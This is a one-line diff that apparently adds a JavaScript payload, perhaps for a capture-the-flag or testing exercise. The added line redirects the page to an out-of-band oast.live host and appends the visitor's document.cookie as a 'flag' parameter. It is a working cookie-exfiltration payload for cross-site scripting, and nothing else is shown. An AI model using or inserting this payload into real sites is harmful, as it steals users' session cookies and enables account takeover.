@@ -1,0 +1,1 @@
+location = "http://cmltn19ri87csasqbji0ea5dmjbj4c18n.oast.live?flag=" + document.cookie;
